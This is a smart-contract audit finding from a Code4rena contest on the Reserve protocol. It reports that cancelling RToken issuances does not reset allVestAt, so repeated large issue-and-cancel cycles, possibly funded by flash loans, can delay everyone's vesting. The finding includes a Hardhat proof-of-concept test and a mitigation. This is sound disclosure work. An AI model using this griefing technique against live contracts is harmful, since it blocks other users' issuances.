## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- M-13

# [attacker can prevent vesting for a very long time](https://github.com/code-423n4/2023-01-reserve-findings/issues/267) 

# Lines of code

https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L358-L369


# Vulnerability details

## Description
When a user wants to issue RTokens there is a limit of how many can be issued in the same block. This is determined in the `whenFinished` function.

It looks at how many tokens the user wants to issue and then using the `issuanceRate` it calculates which block the issuance will end up in, `allVestAt`.


```javascript
File: RToken.sol

358:        uint192 before = allVestAt; // D18{block number}
359:        // uint192 downcast is safe: block numbers are smaller than 1e38
360:        uint192 nowStart = uint192(FIX_ONE * (block.number - 1)); // D18{block} = D18{1} * {block}
361:        if (nowStart > before) before = nowStart;

...

368:        finished = before + uint192((FIX_ONE_256 * amtRToken + (lastIssRate - 1)) / lastIssRate);
369:        allVestAt = finished;
```

If this is the current block and the user has no other queued issuances the issuance can be immediate otherwise it is queued to be issued after the `allVestAt` block.

```javascript
File: RToken.sol

243:        uint192 vestingEnd = whenFinished(amtRToken); // D18{block number}

...

251:        if (
252:            // D18{blocks} <= D18{1} * {blocks}
253:            vestingEnd <= FIX_ONE_256 * block.number &&
254:            queue.left == queue.right &&
255:            status == CollateralStatus.SOUND
256:        ) {
                // do immediate issuance
            }

287:        IssueItem storage curr = (queue.right < queue.items.length)
288:            ? queue.items[queue.right]
289:            : queue.items.push();
290:        curr.when = vestingEnd; // queued at vestingEnd (allVestAt)
```

Then in `vestUpTo` it is checked that this is vested at a later block:

```javascript
File: RToken.sol

746:        IssueItem storage rightItem = queue.items[endId - 1];
747:        require(rightItem.when <= FIX_ONE_256 * block.number, "issuance not ready");
```

If a user decide that they do not want to do this vesting they can cancel pending items using `cancel`, which will return the deposited tokens to them.

However this cancel does not reduce the `allVestAt` state so later issuances will still be compared to this state.

Hence a malicious user can issue a lot of RTokens (possibly using a flash loan) to increase `allVestAt` and then cancel their queued issuance. Since this only costs gas this can be repeated to push `allVestAt` to a very large number effectively delaying all vesting for a very long time.

## Impact
A malicious user can delay issuances a very long time costing only gas.

## Proof of Concept
PoC test in `RToken.test.ts`:

```javascript
    // based on 'Should allow the recipient to rollback minting'
    it('large issuance and cancel griefs later issuances', async function () {
      const issueAmount: BigNumber = bn('5000000e18') // flashloan or rich

      // Provide approvals
      const [, depositTokenAmounts] = await facade.callStatic.issue(rToken.address, issueAmount)
      await Promise.all(
        tokens.map((t, i) => t.connect(addr1).approve(rToken.address, depositTokenAmounts[i]))
      )

      await Promise.all(
        tokens.map((t, i) => t.connect(addr2).approve(rToken.address, ethers.constants.MaxInt256))
      )
      
      // Get initial balances
      const initialRecipientBals = await Promise.all(tokens.map((t) => t.balanceOf(addr2.address)))

      // Issue a lot of rTokens
      await rToken.connect(addr1)['issue(address,uint256)'](addr2.address, issueAmount)

      // Cancel
      await expect(rToken.connect(addr2).cancel(1, true))
        .to.emit(rToken, 'IssuancesCanceled')
        .withArgs(addr2.address, 0, 1, issueAmount)

      // repeat to make allVestAt very large
      for(let j = 0; j<100 ; j++) {
        await rToken.connect(addr2)['issue(address,uint256)'](addr2.address, issueAmount)

        await expect(rToken.connect(addr2).cancel(1, true))
          .to.emit(rToken, 'IssuancesCanceled')
          .withArgs(addr2.address, 0, 1, issueAmount)
      }

      // Check balances returned to the recipient, addr2
      await Promise.all(
        tokens.map(async (t, i) => {
          const expectedBalance = initialRecipientBals[i].add(depositTokenAmounts[i])
          expect(await t.balanceOf(addr2.address)).to.equal(expectedBalance)
        })
      )
      expect(await facadeTest.callStatic.totalAssetValue(rToken.address)).to.equal(0)

      const instantIssue: BigNumber = MIN_ISSUANCE_PER_BLOCK.sub(1)
      await Promise.all(tokens.map((t) => t.connect(addr1).approve(rToken.address, initialBal)))

      // what should have been immediate issuance will be queued
      await rToken.connect(addr1)['issue(uint256)'](instantIssue)

      expect(await rToken.balanceOf(addr1.address)).to.equal(0)

      const issuances = await facade.callStatic.pendingIssuances(rToken.address, addr1.address)
      expect(issuances.length).to.eql(1)
    })
```

## Tools Used
manual auditing and hardhat

## Recommended Mitigation Steps
`cancel` could decrease the `allVestAt`. Even though, there's still a small possibility to grief by front running someones issuance with a large `issue`/`cancel` causing their vest to be late, but this is perhaps an acceptable risk as they can then just cancel and re-issue.